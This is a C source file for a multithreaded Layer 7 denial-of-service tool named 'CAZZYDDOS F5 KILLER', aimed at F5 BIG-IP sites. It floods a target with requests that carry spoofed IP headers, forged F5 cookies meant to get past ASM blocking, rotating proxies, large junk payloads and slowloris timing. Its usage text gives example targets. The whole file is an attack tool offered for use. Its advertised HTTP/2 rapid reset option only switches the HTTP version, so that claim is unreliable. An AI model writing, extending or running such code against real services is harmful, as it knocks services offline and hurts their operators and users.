#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <regex.h>

#define MAX_WORKERS 2000
#define MAX_URL_LEN 4096
#define BUFFER_SIZE 8192
#define MAX_PROXIES 50000
#define MAX_ADAPTIVE_DELAY 8000
#define MAX_PAYLOAD_SIZE (1024 * 1024)

#define COLOR_RESET "\033[0m"
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_WHITE "\033[37m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_CYAN "\033[36m"
#define COLOR_BLUE "\033[34m"

typedef struct {
    char **proxies;
    int count;
    int index;
    pthread_mutex_t mutex;
} ProxyList;

typedef struct {
    long long requests;
    long long responses;
    long long errors;
    long long total_latency;
    long long f5_detected;
    long long asm_blocked;
    long long bigip_cookie;
    pthread_mutex_t mutex;
} AtomicStats;

typedef struct {
    char target_host[256];
    int target_port;
    char target_path[512];
    char target_url[1024];
    char methods[15][10];
    int method_count;
    int duration_sec;
    int concurrency;
    int burst_size;
    int think_time_ms;
    bool random_path;
    bool random_ip;
    bool burst_mode;
    bool adaptive_delay;
    bool f5_bypass;
    bool slowloris_mode;
    bool http2_rapid_reset;
    bool cookie_rotation;
    char proxy_file[256];
    char custom_cookie[512];
    char user_agent_spoof[256];
} AttackConfig;

ProxyList proxy_list = {0};
AtomicStats stats = {0, 0, 0, 0, 0, 0, 0, PTHREAD_MUTEX_INITIALIZER};
volatile bool running = true;
pthread_t worker_threads[MAX_WORKERS];
pthread_t stats_thread;
time_t start_time;
int64_t current_delay = 0;
pthread_mutex_t delay_mutex = PTHREAD_MUTEX_INITIALIZER;
unsigned int rand_state;

const char *F5_COOKIES[] = {"TS", "BIGipServer", "ASPSESSIONID", "BIGipCookie", "MRHSession", NULL};
const char *F5_HEADERS[] = {"X-F5-Client-IP", "X-F5-Client-Port", "X-F5-Forwarded-For", NULL};

const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    NULL
};

const char *RANDOM_PATHS[] = {
    "/tmui/login.jsp", "/tmui/", "/xui/common/", "/mgmt/tm/", "/iControl/",
    "/f5-asm-policy", "/webdav/", "/vulnerability/", "/rest/", "/api/",
    "/stats/", "/monitor/", "/health/", "/status/", "/metrics/",
    "/login", "/admin", "/cgi-bin/", "/phpinfo.php", "/.env",
    "/backup", "/config", "/database", "/dump", "/logs",
    "/wp-admin", "/administrator", "/console", "/shell", "/cmd",
    "/", "/shell-go-plus.html",
    NULL
};

void init_random() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
    srand(rand_state);
    RAND_poll();
}

int rand_int(int min, int max) {
    return min + (rand() % (max - min + 1));
}

bool rand_bool() {
    return rand() % 2 == 0;
}

char* random_string(int n) {
    const char letters[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    char *str = malloc(n + 1);
    if (!str) return NULL;
    for (int i = 0; i < n; i++) {
        str[i] = letters[rand() % (sizeof(letters) - 1)];
    }
    str[n] = '\0';
    return str;
}

char* random_ip() {
    char *ip = malloc(20);
    if (!ip) return NULL;
    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
    return ip;
}

char* generate_f5_cookie() {
    char *cookie = malloc(256);
    if (!cookie) return NULL;
    
    const char *cookie_name = F5_COOKIES[rand_int(0, 3)];
    char *random_val = random_string(rand_int(16, 32));
    
    snprintf(cookie, 256, "%s=%s", cookie_name, random_val);
    free(random_val);
    
    return cookie;
}

char* generate_large_payload(int *size) {
    *size = rand_int(1024 * 10, MAX_PAYLOAD_SIZE);
    char *payload = malloc(*size + 1);
    if (!payload) return NULL;
    
    const char *patterns[] = {
        "POST", "GET", "HEAD", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE",
        "HTTP/1.1", "HTTP/2.0", "Host:", "User-Agent:", "Accept:", "Content-Type:",
        "X-Forwarded-For:", "X-Real-IP:", "Cookie:", "Referer:", "Origin:"
    };
    
    int pos = 0;
    while (pos < *size) {
        const char *pattern = patterns[rand_int(0, 17)];
        int pattern_len = strlen(pattern);
        int remaining = *size - pos;
        
        if (remaining > pattern_len + 2) {
            memcpy(payload + pos, pattern, pattern_len);
            pos += pattern_len;
            if (rand_bool()) {
                payload[pos++] = '\r';
                payload[pos++] = '\n';
            } else {
                payload[pos++] = ' ';
            }
        } else {
            payload[pos++] = 'A' + (rand() % 26);
        }
    }
    payload[*size] = '\0';
    return payload;
}

char* generate_random_path() {
    int path_count = 0;
    while (RANDOM_PATHS[path_count] != NULL) path_count++;
    
    char *result = malloc(MAX_URL_LEN);
    if (!result) return NULL;
    
    const char *base_path = RANDOM_PATHS[rand_int(0, path_count - 1)];
    strcpy(result, base_path);
    
    if (rand_bool()) {
        char query[512];
        snprintf(query, sizeof(query), "?%s=%s&_=%ld&v=%d",
                random_string(rand_int(5, 10)),
                random_string(rand_int(8, 16)),
                time(NULL),
                rand_int(1, 999999));
        strcat(result, query);
    }
    
    return result;
}

const char* get_random_user_agent() {
    int count = 0;
    while (USER_AGENTS[count] != NULL) count++;
    return USER_AGENTS[rand_int(0, count - 1)];
}

void load_proxies(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf(COLOR_RED "[-] Failed to load proxies file: %s\n" COLOR_RESET, filename);
        return;
    }
    
    pthread_mutex_lock(&proxy_list.mutex);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
    proxy_list.count = 0;
    
    char line[256];
    while (fgets(line, sizeof(line), file) && proxy_list.count < MAX_PROXIES) {
        line[strcspn(line, "\r\n")] = 0;
        if (strlen(line) > 0 && strchr(line, ':')) {
            proxy_list.proxies[proxy_list.count] = strdup(line);
            proxy_list.count++;
        }
    }
    
    fclose(file);
    proxy_list.index = 0;
    pthread_mutex_unlock(&proxy_list.mutex);
    
    printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
}

char* get_random_proxy() {
    pthread_mutex_lock(&proxy_list.mutex);
    if (proxy_list.count == 0) {
        pthread_mutex_unlock(&proxy_list.mutex);
        return NULL;
    }
    char *proxy = strdup(proxy_list.proxies[rand_int(0, proxy_list.count - 1)]);
    pthread_mutex_unlock(&proxy_list.mutex);
    return proxy;
}

void send_f5_attack_request(AttackConfig *cfg, const char *proxy) {
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char full_url[MAX_URL_LEN];
    char *path = cfg->random_path ? generate_random_path() : strdup(cfg->target_path);
    
    snprintf(full_url, sizeof(full_url), "%s%s", cfg->target_url, path);
    
    struct curl_slist *headers = NULL;
    const char *method = cfg->methods[rand_int(0, cfg->method_count - 1)];
    const char *ua = cfg->user_agent_spoof[0] ? cfg->user_agent_spoof : get_random_user_agent();
    char *ip = cfg->random_ip ? random_ip() : NULL;
    char *f5_cookie = cfg->cookie_rotation ? generate_f5_cookie() : NULL;
    
    char ua_header[512];
    char ip_header[256];
    char cookie_header[512];
    char f5_header[256];
    
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", ua);
    headers = curl_slist_append(headers, ua_header);
    
    if (ip) {
        snprintf(ip_header, sizeof(ip_header), "X-Forwarded-For: %s", ip);
        headers = curl_slist_append(headers, ip_header);
        snprintf(ip_header, sizeof(ip_header), "X-Real-IP: %s", ip);
        headers = curl_slist_append(headers, ip_header);
    }
    
    if (f5_cookie && cfg->f5_bypass) {
        snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s", f5_cookie);
        headers = curl_slist_append(headers, cookie_header);
    }
    
    if (cfg->custom_cookie[0]) {
        snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s", cfg->custom_cookie);
        headers = curl_slist_append(headers, cookie_header);
    }
    
    snprintf(f5_header, sizeof(f5_header), "X-F5-Client-IP: %s", ip ? ip : cfg->target_host);
    headers = curl_slist_append(headers, f5_header);
    
    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, "Connection: keep-alive");
    headers = curl_slist_append(headers, "Cache-Control: no-cache, no-store, must-revalidate");
    headers = curl_slist_append(headers, "Pragma: no-cache");
    headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
    
    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
    
    if (proxy) {
        curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    
    if (strcmp(method, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        int payload_size;
        char *payload = generate_large_payload(&payload_size);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, payload_size);
        free(payload);
    } else if (strcmp(method, "HEAD") == 0) {
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    } else if (strcmp(method, "PUT") == 0 || strcmp(method, "DELETE") == 0 || strcmp(method, "PATCH") == 0) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method);
        int payload_size;
        char *payload = generate_large_payload(&payload_size);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, payload_size);
        free(payload);
    } else {
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    }
    
    if (cfg->slowloris_mode) {
        curl_easy_setopt(curl, CURLOPT_LOW_SPEED_LIMIT, 1L);
        curl_easy_setopt(curl, CURLOPT_LOW_SPEED_TIME, 30L);
    }
    
    if (cfg->http2_rapid_reset) {
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    }
    
    struct timeval start, end;
    gettimeofday(&start, NULL);
    
    CURLcode res = curl_easy_perform(curl);
    
    gettimeofday(&end, NULL);
    long latency = (end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000;
    
    if (res == CURLE_OK) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        pthread_mutex_lock(&stats.mutex);
        stats.responses++;
        stats.total_latency += latency;
        
        if (response_code == 403 || response_code == 406 || response_code == 503) {
            stats.asm_blocked++;
        }
        pthread_mutex_unlock(&stats.mutex);
    } else {
        pthread_mutex_lock(&stats.mutex);
        stats.errors++;
        pthread_mutex_unlock(&stats.mutex);
    }
    
    pthread_mutex_lock(&stats.mutex);
    stats.requests++;
    pthread_mutex_unlock(&stats.mutex);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(path);
    if (ip) free(ip);
    if (f5_cookie) free(f5_cookie);
}

void* worker_function(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    int bursts_since_cycle = 0;
    const int cycle_threshold = 100;
    
    while (running) {
        char *proxy = (cfg->proxy_file[0] && proxy_list.count > 0) ? get_random_proxy() : NULL;
        
        int burst_count = cfg->burst_mode ? (1 + rand_int(0, cfg->burst_size)) : 1;
        
        for (int i = 0; i < burst_count && running; i++) {
            send_f5_attack_request(cfg, proxy);
            
            if (i < burst_count - 1) {
                usleep(rand_int(5, 20) * 1000);
            }
        }
        
        if (proxy) free(proxy);
        
        bursts_since_cycle++;
        
        if (bursts_since_cycle > cycle_threshold) {
            usleep(100000);
            bursts_since_cycle = 0;
        }
        
        int64_t delay = 0;
        pthread_mutex_lock(&delay_mutex);
        delay = current_delay;
        pthread_mutex_unlock(&delay_mutex);
        
        int think_time = rand_int(0, cfg->think_time_ms);
        usleep((delay + think_time) * 1000);
        
        if (cfg->adaptive_delay) {
            pthread_mutex_lock(&delay_mutex);
            if (current_delay > 0) {
                current_delay = (int64_t)(current_delay * 0.9);
            }
            pthread_mutex_unlock(&delay_mutex);
        }
    }
    
    return NULL;
}

void* stats_printer_function(void *arg) {
    AttackConfig *cfg = (AttackConfig*)arg;
    
    while (running) {
        sleep(1);
        
        time_t now = time(NULL);
        double elapsed = difftime(now, start_time);
        
        long long requests, responses, errors, total_lat, asm_blocked;
        
        pthread_mutex_lock(&stats.mutex);
        requests = stats.requests;
        responses = stats.responses;
        errors = stats.errors;
        total_lat = stats.total_latency;
        asm_blocked = stats.asm_blocked;
        pthread_mutex_unlock(&stats.mutex);
        
        double rps = elapsed > 0 ? requests / elapsed : 0;
        double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
        double success_rate = requests > 0 ? (double)responses / requests * 100 : 0;
        
        printf("\r\033[K");
        printf(COLOR_CYAN "[%.0fs/%ds] " COLOR_RESET, elapsed, cfg->duration_sec);
        printf(COLOR_GREEN "Req: %lld " COLOR_RESET, requests);
        printf(COLOR_YELLOW "Res: %lld " COLOR_RESET, responses);
        printf(COLOR_RED "Err: %lld " COLOR_RESET, errors);
        printf(COLOR_WHITE "RPS: %.0f " COLOR_RESET, rps);
        printf(COLOR_BLUE "Lat: %.0fms " COLOR_RESET, avg_latency);
        printf(COLOR_MAGENTA "Success: %.1f%% " COLOR_RESET, success_rate);
        printf(COLOR_RED "ASM: %lld" COLOR_RESET, asm_blocked);
        fflush(stdout);
    }
    
    return NULL;
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf(COLOR_YELLOW "\n[!] Shutting down...\n" COLOR_RESET);
        running = false;
    }
}

void print_banner() {
    printf(COLOR_RED);
    printf("╔══════════════════════════════════════════════════════════════════════════════════╗\n");
    printf("║     ██████╗ █████╗ ███████╗███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███████╗    ║\n");
    printf("║    ██╔════╝██╔══██╗╚══███╔╝██╔════╝╚██╗ ██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ║\n");
    printf("║    ██║     ███████║  ███╔╝ ███████╗ ╚████╔╝ ██║  ██║██║  ██║██║   ██║███████╗    ║\n");
    printf("║    ██║     ██╔══██║ ███╔╝  ╚════██║  ╚██╔╝  ██║  ██║██║  ██║██║   ██║╚════██║    ║\n");
    printf("║    ╚██████╗██║  ██║███████╗███████║   ██║   ██████╔╝██████╔╝╚██████╔╝███████║    ║\n");
    printf("║     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ║\n");
    printf("║                                                                                  ║\n");
    printf("║                    ███████╗███████╗    ██████╗ ██╗ ██████╗                     ║\n");
    printf("║                    ╚══███╔╝██╔════╝    ██╔══██╗██║██╔════╝                     ║\n");
    printf("║                      ███╔╝ █████╗      ██████╔╝██║██║  ███╗                    ║\n");
    printf("║                     ███╔╝  ██╔══╝      ██╔══██╗██║██║   ██║                    ║\n");
    printf("║                    ███████╗██║         ██████╔╝██║╚██████╔╝                    ║\n");
    printf("║                    ╚══════╝╚═╝         ╚═════╝ ╚═╝ ╚═════╝                     ║\n");
    printf("║                                                                                  ║\n");
    printf("║                    C A Z Z Y D D O S   F 5   K I L L E R                        ║\n");
    printf("║              Advanced Layer 7 DDoS Tool - F5 BIG-IP Optimized                   ║\n");
    printf("╚══════════════════════════════════════════════════════════════════════════════════╝\n");
    printf(COLOR_RESET);
}

int main(int argc, char *argv[]) {
    AttackConfig cfg = {0};
    
    cfg.duration_sec = 60;
    cfg.concurrency = 500;
    cfg.burst_size = 20;
    cfg.think_time_ms = 50;
    cfg.random_path = true;
    cfg.random_ip = true;
    cfg.burst_mode = true;
    cfg.adaptive_delay = false;
    cfg.f5_bypass = true;
    cfg.slowloris_mode = false;
    cfg.http2_rapid_reset = true;
    cfg.cookie_rotation = true;
    cfg.method_count = 5;
    strcpy(cfg.methods[0], "GET");
    strcpy(cfg.methods[1], "POST");
    strcpy(cfg.methods[2], "PUT");
    strcpy(cfg.methods[3], "DELETE");
    strcpy(cfg.methods[4], "HEAD");
    cfg.proxy_file[0] = '\0';
    cfg.custom_cookie[0] = '\0';
    cfg.user_agent_spoof[0] = '\0';
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-url") == 0 && i+1 < argc) {
            strncpy(cfg.target_url, argv[++i], 1023);
        } else if (strcmp(argv[i], "-duration") == 0 && i+1 < argc) {
            cfg.duration_sec = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-concurrency") == 0 && i+1 < argc) {
            cfg.concurrency = atoi(argv[++i]);
            if (cfg.concurrency > MAX_WORKERS) cfg.concurrency = MAX_WORKERS;
        } else if (strcmp(argv[i], "-methods") == 0 && i+1 < argc) {
            char *token = strtok(argv[++i], ",");
            cfg.method_count = 0;
            while (token && cfg.method_count < 15) {
                strncpy(cfg.methods[cfg.method_count++], token, 9);
                token = strtok(NULL, ",");
            }
        } else if (strcmp(argv[i], "-burst-size") == 0 && i+1 < argc) {
            cfg.burst_size = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-think-time") == 0 && i+1 < argc) {
            cfg.think_time_ms = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-f5-bypass") == 0) {
            cfg.f5_bypass = true;
        } else if (strcmp(argv[i], "-slowloris") == 0) {
            cfg.slowloris_mode = true;
        } else if (strcmp(argv[i], "-http2-reset") == 0) {
            cfg.http2_rapid_reset = true;
        } else if (strcmp(argv[i], "-cookie-rotate") == 0) {
            cfg.cookie_rotation = true;
        } else if (strcmp(argv[i], "-proxy-file") == 0 && i+1 < argc) {
            strncpy(cfg.proxy_file, argv[++i], 255);
        } else if (strcmp(argv[i], "-custom-cookie") == 0 && i+1 < argc) {
            strncpy(cfg.custom_cookie, argv[++i], 511);
        } else if (strcmp(argv[i], "-user-agent") == 0 && i+1 < argc) {
            strncpy(cfg.user_agent_spoof, argv[++i], 255);
        } else if (strcmp(argv[i], "-help") == 0) {
            print_banner();
            printf("\nUsage: %s -url <target> [options]\n\n", argv[0]);
            printf("F5 BIG-IP Specific Options:\n");
            printf("  -f5-bypass           Enable F5 bypass techniques\n");
            printf("  -cookie-rotate       Rotate F5 cookies (TS, BIGipServer)\n");
            printf("  -http2-reset         Use HTTP/2 rapid reset (CVE-2023-44487)\n");
            printf("  -slowloris           Enable slowloris mode\n\n");
            printf("General Options:\n");
            printf("  -url <url>           Target URL (required)\n");
            printf("  -duration <sec>      Duration in seconds (default: 60)\n");
            printf("  -concurrency <n>     Concurrent workers (default: 500)\n");
            printf("  -methods <list>      HTTP methods (default: GET,POST,PUT,DELETE,HEAD)\n");
            printf("  -burst-size <n>      Burst size (default: 20)\n");
            printf("  -think-time <ms>     Think time between requests (default: 50)\n");
            printf("  -proxy-file <file>   Proxy list file\n");
            printf("  -custom-cookie <c>   Custom cookie value\n");
            printf("  -user-agent <ua>     Custom user agent\n\n");
            printf("Examples:\n");
            printf("  %s -url https://f5.target.com -duration 60 -concurrency 1000 -f5-bypass -http2-reset\n", argv[0]);
            printf("  %s -url https://bigip.company.com -duration 120 -concurrency 500 -cookie-rotate -slowloris\n", argv[0]);
            return 0;
        }
    }
    
    if (strlen(cfg.target_url) == 0) {
        print_banner();
        printf(COLOR_RED "\n[-] Error: -url is required\n" COLOR_RESET);
        return 1;
    }
    
    char *host_start;
    if (strstr(cfg.target_url, "://")) {
        host_start = strstr(cfg.target_url, "://") + 3;
    } else {
        host_start = cfg.target_url;
    }
    
    char *path_start = strchr(host_start, '/');
    if (path_start) {
        size_t host_len = path_start - host_start;
        if (host_len < sizeof(cfg.target_host)) {
            memcpy(cfg.target_host, host_start, host_len);
            cfg.target_host[host_len] = '\0';
        }
        strncpy(cfg.target_path, path_start, sizeof(cfg.target_path) - 1);
        cfg.target_path[sizeof(cfg.target_path) - 1] = '\0';
    } else {
        strncpy(cfg.target_host, host_start, sizeof(cfg.target_host) - 1);
        cfg.target_host[sizeof(cfg.target_host) - 1] = '\0';
        strcpy(cfg.target_path, "/");
    }
    
    cfg.target_port = 443;
    char *port_sep = strchr(cfg.target_host, ':');
    if (port_sep) {
        *port_sep = '\0';
        cfg.target_port = atoi(port_sep + 1);
    }
    
    init_random();
    curl_global_init(CURL_GLOBAL_ALL);
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (cfg.proxy_file[0]) {
        load_proxies(cfg.proxy_file);
    }
    
    print_banner();
    printf(COLOR_CYAN "\n[+] Target: %s:%d%s\n" COLOR_RESET, cfg.target_host, cfg.target_port, cfg.target_path);
    printf(COLOR_CYAN "[+] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_CYAN "[+] Concurrency: %d\n" COLOR_RESET, cfg.concurrency);
    printf(COLOR_CYAN "[+] Methods: ");
    for (int i = 0; i < cfg.method_count; i++) {
        printf("%s ", cfg.methods[i]);
    }
    printf("\n" COLOR_RESET);
    printf(COLOR_CYAN "[+] Burst Size: %d\n" COLOR_RESET, cfg.burst_size);
    printf(COLOR_CYAN "[+] Think Time: %d ms\n" COLOR_RESET, cfg.think_time_ms);
    printf(COLOR_GREEN "[+] F5 Bypass: %s\n" COLOR_RESET, cfg.f5_bypass ? "Enabled" : "Disabled");
    printf(COLOR_GREEN "[+] Cookie Rotation: %s\n" COLOR_RESET, cfg.cookie_rotation ? "Enabled" : "Disabled");
    printf(COLOR_GREEN "[+] HTTP/2 Rapid Reset: %s\n" COLOR_RESET, cfg.http2_rapid_reset ? "Enabled" : "Disabled");
    printf(COLOR_GREEN "[+] Slowloris Mode: %s\n" COLOR_RESET, cfg.slowloris_mode ? "Enabled" : "Disabled");
    printf(COLOR_GREEN "[+] Random IP: %s\n" COLOR_RESET, cfg.random_ip ? "Enabled" : "Disabled");
    printf(COLOR_GREEN "[+] Random Path: %s\n" COLOR_RESET, cfg.random_path ? "Enabled" : "Disabled");
    
    if (cfg.proxy_file[0]) {
        printf(COLOR_GREEN "[+] Proxies: %s\n" COLOR_RESET, cfg.proxy_file);
    }
    
    printf(COLOR_YELLOW "\n[!] Starting F5 BIG-IP attack... Press Ctrl+C to stop\n\n" COLOR_RESET);
    
    start_time = time(NULL);
    running = true;
    
    pthread_create(&stats_thread, NULL, stats_printer_function, &cfg);
    
    AttackConfig *configs = malloc(sizeof(AttackConfig) * cfg.concurrency);
    for (int i = 0; i < cfg.concurrency; i++) {
        memcpy(&configs[i], &cfg, sizeof(AttackConfig));
        pthread_create(&worker_threads[i], NULL, worker_function, &configs[i]);
    }
    
    sleep(cfg.duration_sec);
    running = false;
    
    for (int i = 0; i < cfg.concurrency; i++) {
        pthread_join(worker_threads[i], NULL);
    }
    pthread_join(stats_thread, NULL);
    
    long long requests, responses, errors, total_lat, asm_blocked;
    
    pthread_mutex_lock(&stats.mutex);
    requests = stats.requests;
    responses = stats.responses;
    errors = stats.errors;
    total_lat = stats.total_latency;
    asm_blocked = stats.asm_blocked;
    pthread_mutex_unlock(&stats.mutex);
    
    double avg_rps = (double)requests / cfg.duration_sec;
    double avg_latency = responses > 0 ? (double)total_lat / responses : 0;
    double success_rate = requests > 0 ? (double)responses / requests * 100 : 0;
    
    printf("\n\n" COLOR_MAGENTA "========== FINAL STATISTICS ==========\n" COLOR_RESET);
    printf(COLOR_CYAN "Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
    printf(COLOR_GREEN "Total Requests: %lld\n" COLOR_RESET, requests);
    printf(COLOR_YELLOW "Responses: %lld\n" COLOR_RESET, responses);
    printf(COLOR_RED "Errors: %lld\n" COLOR_RESET, errors);
    printf(COLOR_WHITE "Success Rate: %.2f%%\n" COLOR_RESET, success_rate);
    printf(COLOR_WHITE "Average RPS: %.2f\n" COLOR_RESET, avg_rps);
    printf(COLOR_WHITE "Average Latency: %.2fms\n" COLOR_RESET, avg_latency);
    printf(COLOR_RED "F5 ASM Blocked: %lld\n" COLOR_RESET, asm_blocked);
    printf(COLOR_MAGENTA "=========================================\n" COLOR_RESET);
    
    if (proxy_list.proxies) {
        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
        free(proxy_list.proxies);
    }
    
    free(configs);
    curl_global_cleanup();
    EVP_cleanup();
    ERR_free_strings();
    
    return 0;
}
